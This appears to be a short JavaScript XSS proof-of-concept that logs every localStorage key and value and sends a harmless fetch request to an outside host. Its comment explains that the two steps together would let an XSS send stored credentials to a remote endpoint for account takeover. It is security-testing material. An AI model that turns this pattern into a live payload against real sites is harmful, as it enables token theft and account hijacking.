// Iterate through localStorage keys and post them to console. 
for (let i = 0; i < localStorage.length; i++) { 
const key = localStorage.key(i); 
const value = localStorage.getItem(key); 
console.log(key, value); 
}
// Make a HTTP request to this website, showing that a query can be formed from variables in this context without actually sending them
const v = "test";
fetch("https://marnall.github.io/fakeparam="+v);
// If both tests above are successful, then most likely a JS XSS can be used to send the localStorage keys to a remote endpoint, demonstrating a potential for credential exfiltration and account takeover.